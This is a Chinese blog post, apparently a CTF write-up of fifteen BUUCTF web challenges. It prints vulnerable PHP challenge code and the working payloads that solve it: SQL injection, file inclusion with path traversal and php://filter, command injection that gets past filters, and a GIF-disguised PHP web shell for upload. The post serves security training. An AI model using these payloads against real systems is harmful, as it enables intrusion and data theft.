<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="郁涛丶"><title>BUU_WEB刷题_0x01-0x0F · 郁涛丶's Blog</title><meta name="description" content="[TOC]
0x1.[HCTF 2018]WarmUp代码审计+文件包含
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&amp;lt;?php    highli"><meta name="keywords" content="郁涛丶博客,博客,郁涛丶"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">郁涛丶's Blog</a></h3><div class="description"><p>怕什么真理无穷， 进一寸有一寸的欢喜。</p></div></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/ghostasky"><i class="fa fa-github"></i></a></li><li><a href="mailto:2992721672@qq.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="http://sighttp.qq.com/authd?IDKEY=2992721672"><i class="fa fa-qq"></i></a></li></ul><div class="footer"><div class="p"> <span>© 2017 - 2020 </span><i class="fa fa-star"></i><span> 郁涛丶</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/mrcore/hexo-theme-Anatole-Core" target="_blank">Anatole-Core  </a></div><div class="beian"><a href="http://www.beian.miit.gov.cn/" target="_blank">粤ICP备15011643号</a><span style="height:10px;margin-left: 10px;">|</span><img src="/images/gongan.png" style="height:10px;margin-left: 10px;position: relative;top: 1px;"><span style="margin-left: 2px;">粤公网安备 44030402003967号</span></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">标签</a></li><li><a href="/about">关于</a></li><li><a href="/guestbook">随笔小记</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>BUU_WEB刷题_0x01-0x0F</a></h3></div><div class="post-content"><p>[TOC]</p>
<h2 id="0x1-HCTF-2018-WarmUp"><a href="#0x1-HCTF-2018-WarmUp" class="headerlink" title="0x1.[HCTF 2018]WarmUp"></a>0x1.[HCTF 2018]WarmUp</h2><p>代码审计+文件包含</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line"><span class="comment">/*这里mb_sustr 是个截断，返回0到mb_strpos之间的内容，而mb_strps 则是查找第一次出现的位置，</span></span><br><span class="line"><span class="comment">所以基本可以理解为获取page 两个？之间的字符串，也就是获取file两个？之间的字符串，放到url中就是http://ip/?file=ddd?中的file=ddd*/</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>?file=source.php?/../../../../ffffllllaaaagggg</code></p>
<p>或</p>
<p><code>?file=hint.php?/../../../../ffffllllaaaagggg</code></p>
<h2 id="0x2-极客大挑战-2019-EasySQL"><a href="#0x2-极客大挑战-2019-EasySQL" class="headerlink" title="0x2.[极客大挑战 2019]EasySQL"></a>0x2.[极客大挑战 2019]EasySQL</h2><p>直接</p>
<p><code>payload: username=admin&#39; or &#39;1&#39;=&#39;1&amp;password=aaa&#39; or &#39;1&#39;=&#39;1</code></p>
<p><code>username=admin&amp;password=aa&#39; or &#39;1&#39;=&#39;1</code></p>
<h2 id="0x3-强网杯-2019-随便注"><a href="#0x3-强网杯-2019-随便注" class="headerlink" title="0x3.[强网杯 2019]随便注"></a>0x3.[强网杯 2019]随便注</h2><p>用union select 时：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>

<h3 id="1）-堆叠注入："><a href="#1）-堆叠注入：" class="headerlink" title="1）.堆叠注入："></a>1）.堆叠注入：</h3><p>show database;</p>
<p>show tables;</p>
<p>查看表结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">desc `1919810931114514`--+</span><br><span class="line">注意要用`引起来</span><br><span class="line">或：show colunms from `1919810931114514`</span><br></pre></td></tr></table></figure>

<p>可以知道，有两个表，words，1919810931114514(这里面有flag)。</p>
<p>大致查询语句应该为：select id,data from words where id=;</p>
<p>那么可以将words表改名为aaa，将1919810931114514改为words，再将id改为flag。（偷天换日的感觉）</p>
<blockquote>
<p> 0’;rename table words to words1;</p>
<p> rename table <code>1919810931114514</code> to words;</p>
<p> alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</p>
<p> desc  words;#</p>
</blockquote>
<h2 id="0x4-极客大挑战-2019-Havefun"><a href="#0x4-极客大挑战-2019-Havefun" class="headerlink" title="0x4.[极客大挑战 2019]Havefun"></a>0x4.[极客大挑战 2019]Havefun</h2><p>看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cat</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$cat</span>==<span class="string">&#x27;dog&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接出flag</p>
<h2 id="0x5-SUCTF-2019-EasySQL"><a href="#0x5-SUCTF-2019-EasySQL" class="headerlink" title="0x5.[SUCTF 2019]EasySQL"></a>0x5.[SUCTF 2019]EasySQL</h2><p>还是堆叠注入</p>
<p>show databases;和show tables后就不知道干啥了。。</p>
<p>后来看了wp：select $_post[query] || flag from flag</p>
<h3 id="1）正解"><a href="#1）正解" class="headerlink" title="1）正解"></a>1）正解</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">set</span> sql_mode<span class="operator">=</span>pipes_as_concat;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>即：selecr 1;sett sql_mode=pips_as_concat;select 1 || flag from flag</p>
<p><strong>补充</strong>：</p>
<p>补充系统变量@@sql_mode：是一组mysql支持的基本语法及校验规则<br>PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42373127/article/details/88866710">Mysql中sql_mode参数</a></p>
<h3 id="2）非预期解"><a href="#2）非预期解" class="headerlink" title="2）非预期解"></a>2）非预期解</h3><p>构造：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,1 || flag from flag</span><br></pre></td></tr></table></figure>

<h2 id="0x6-ACTF2020-新生赛-Include"><a href="#0x6-ACTF2020-新生赛-Include" class="headerlink" title="0x6.[ACTF2020 新生赛]Include"></a>0x6.[ACTF2020 新生赛]Include</h2><p>使用php://input 伪协议+POST发送php代码，不行</p>
<p>使用php://filter伪协议进行包含</p>
<p>于是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>php://filter与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。</p>
<p>php://filter 伪协议文件包含读取源代码，加上read=convert.base64-encode，用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。</p>
<h2 id="0x7-极客大挑战-2019-Secret-File"><a href="#0x7-极客大挑战-2019-Secret-File" class="headerlink" title="0x7.[极客大挑战 2019]Secret File"></a>0x7.[极客大挑战 2019]Secret File</h2><p>有个action.php的文件，之后抓包访问，有个secr3t.php文件，访问：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br></pre></td></tr></table></figure>

<p>可以和上一题一样，php://filter</p>
<p>payload=?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
<p>解码:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                echo &quot;我就在这里&quot;;</span><br><span class="line">                $flag = &#x27;flag&#123;2c021ef6-68a2-4674-bf4d-ca928f144327&#125;&#x27;;</span><br><span class="line">                $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="0x8-极客大挑战-2019-LoveSQL"><a href="#0x8-极客大挑战-2019-LoveSQL" class="headerlink" title="0x8.[极客大挑战 2019]LoveSQL"></a>0x8.[极客大挑战 2019]LoveSQL</h2><p>不知道为啥，这里只能%23，不能#和–+</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">?username=admin&#x27;%23&amp;password=1</span><br><span class="line"></span><br><span class="line">?username=admin&#x27; order by 3%23&amp;password=1</span><br><span class="line"></span><br><span class="line">?username=111&#x27; union select 1,2,3%23&amp;password=1</span><br><span class="line">是2和3</span><br><span class="line"></span><br><span class="line">?username=111&#x27; union select 1,database(),3%23&amp;password=1</span><br><span class="line">数据库名：geek</span><br><span class="line"></span><br><span class="line">?username=111&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;geek&#x27;%23&amp;password=1</span><br><span class="line">得到可疑表：l0ve1ysq1</span><br><span class="line"></span><br><span class="line">?username=111&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;geek&#x27; and table_name=&#x27;l0ve1ysq1&#x27;%23&amp;password=1</span><br><span class="line">得到字段id,username,password</span><br><span class="line"></span><br><span class="line">?username=111&#x27; union select 1,group_concat(id,username,password),3 from geek.l0ve1ysq1%23&amp;password=1</span><br><span class="line">或者：</span><br><span class="line">?username=111&#x27; union select id,username,password from geek.l0ve1ysq1 limit 0,1%23&amp;password=1</span><br><span class="line">一个一个查</span><br></pre></td></tr></table></figure>

<h2 id="0x9-ACTF2020-新生赛-Exec"><a href="#0x9-ACTF2020-新生赛-Exec" class="headerlink" title="0x9.[ACTF2020 新生赛]Exec"></a>0x9.[ACTF2020 新生赛]Exec</h2><p>就是连接命令，可以管道符||，也可以分号，或者&amp;这个符号。</p>
<p>但是经过测试，之后分号可以多个命令一起执行（在这道题）</p>
<p><img src="/.com//image-20210415165001140.png" alt="image-20210415165001140"></p>
<p>找到flag.</p>
<h2 id="0xA-GXYCTF2019-Ping-Ping-Ping"><a href="#0xA-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="0xA.[GXYCTF2019]Ping Ping Ping"></a>0xA.[GXYCTF2019]Ping Ping Ping</h2><p>打开后发现无论是cat flag.php还是index.php都打不开，经过测试发现可能是过滤了空格。</p>
<blockquote>
<ol>
<li> ${IFS}替换</li>
<li> $IFS$1替换</li>
<li> ${IFS替换</li>
<li> %20替换</li>
<li> &lt;和&lt;&gt;重定向符替换</li>
<li> %09替换</li>
</ol>
</blockquote>
<p>$IFS是shell中的一个变量，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到确实过滤了很多东西</p>
<h3 id="1-拼接"><a href="#1-拼接" class="headerlink" title="1)拼接"></a>1)拼接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;a=g;cat$IFS$1fla$a.php;</span><br></pre></td></tr></table></figure>

<h3 id="2-base64"><a href="#2-base64" class="headerlink" title="2)base64"></a>2)base64</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>

<p>其中Y2F0IGZsYWcucGhw是cat flag.php的base64编码，之后用base64 -d命令解码</p>
<h3 id="3-内敛绕过-NB"><a href="#3-内敛绕过-NB" class="headerlink" title="3)内敛绕过(NB)"></a>3)内敛绕过(NB)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=111;cat$IFS$1`ls`</span><br></pre></td></tr></table></figure>

<p>就是将反引号内命令的输出作为输入执行。</p>
<h2 id="0xB-极客大挑战-2019-Knife"><a href="#0xB-极客大挑战-2019-Knife" class="headerlink" title="0xB.[极客大挑战 2019]Knife"></a>0xB.[极客大挑战 2019]Knife</h2><p>菜刀连一下就OK</p>
<h2 id="0xC-RoarCTF-2019-Easy-Calc"><a href="#0xC-RoarCTF-2019-Easy-Calc" class="headerlink" title="0xC.[RoarCTF 2019]Easy Calc"></a>0xC.[RoarCTF 2019]Easy Calc</h2><p>这题用到的知识点：<strong>PHP的字符串解析特性</strong></p>
<p><strong>可以先查看根目录下文件：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num=1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20210415181858484.png" alt="image-20210415181858484"></p>
<p>为什么要在num前加空格？</p>
<p>​    假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
<p>如果发现过滤，可以使用chr()转ascii之后拼接。</p>
<p><strong>列出flagg</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>

<p>之后得到flag</p>
<p><strong>PHP的字符串解析特性是什么？</strong></p>
<p>答： PHP需要将所有参数转换为有效的变量名，因此在<strong>解析查询字符串时</strong>，它会做两件事：</p>
<p>1.删除空白符 </p>
<p>2.将某些字符转换为下划线（包括空格）</p>
<p>[当waf不让你过的时候，php却可以让你过]</p>
<p>还有一种方法：</p>
<p><strong>HTTP走私攻击（HTTP数据接收不同步攻击）</strong></p>
<h2 id="0xD-极客大挑战-2019-Http"><a href="#0xD-极客大挑战-2019-Http" class="headerlink" title="0xD.[极客大挑战 2019]Http"></a>0xD.[极客大挑战 2019]Http</h2><p>找到Secret.php文件</p>
<p>说没有来自<a target="_blank" rel="noopener" href="https://www.sycsecret.com网站,加/">https://www.Sycsecret.com网站，加</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:https://www.Sycsecret.com</span><br></pre></td></tr></table></figure>

<p>又说不是某个浏览器i，该user-agent</p>
<p>说只能来自本地：X-Forwarded-For:127.0.0.1</p>
<p>之后得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Referer：来自哪个网站</span><br><span class="line">User-agent：浏览器</span><br><span class="line">x-forwarded-for：伪造IP</span><br></pre></td></tr></table></figure>

<h2 id="0xE-极客大挑战-2019-Upload"><a href="#0xE-极客大挑战-2019-Upload" class="headerlink" title="0xE.[极客大挑战 2019]Upload"></a>0xE.[极客大挑战 2019]Upload</h2><p>文件上传，</p>
<p>常用一句话：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>绕过后缀：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php,php3,php4,php5,phtml,pht</span><br></pre></td></tr></table></figure>

<p>更改文件类型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">image/jpeg</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2 id="0xF-极客大挑战-2019-BabySQL"><a href="#0xF-极客大挑战-2019-BabySQL" class="headerlink" title="0xF.[极客大挑战 2019]BabySQL"></a>0xF.[极客大挑战 2019]BabySQL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">对or by 有过滤</span><br><span class="line">用union select试下</span><br><span class="line">check.php?username=admin&amp;password=111 %27 uniounionn selecselectt 1,2,3%23</span><br><span class="line"></span><br><span class="line">check.php?username=admin&amp;password=111 %27 uniounionn selecselectt 1,group_concat(schema_name),3 frofromm infoorrmation_schema.schemata %23</span><br><span class="line">可疑数据库：ctf</span><br><span class="line"></span><br><span class="line">check.php?username=admin&amp;password=111 %27 uniounionn selecselectt 1,group_concat(table_name),3 frofromm infoorrmation_schema.tables whewherere table_schema=&#x27;ctf&#x27; %23</span><br><span class="line">有Flag表</span><br><span class="line"></span><br><span class="line">check.php?username=admin&amp;password=111 %27 uniounionn selecselectt 1,group_concat(column_name),3 frofromm infoorrmation_schema.columns whewherere table_schema=&#x27;ctf&#x27; aandnd column_name=&#x27;Flag&#x27;%23</span><br><span class="line">有flag</span><br><span class="line"></span><br><span class="line">check.php?username=admin&amp;password=111 %27 uniounionn selecselectt 1,flag,3 frofromm ctf.Flag%23</span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure>

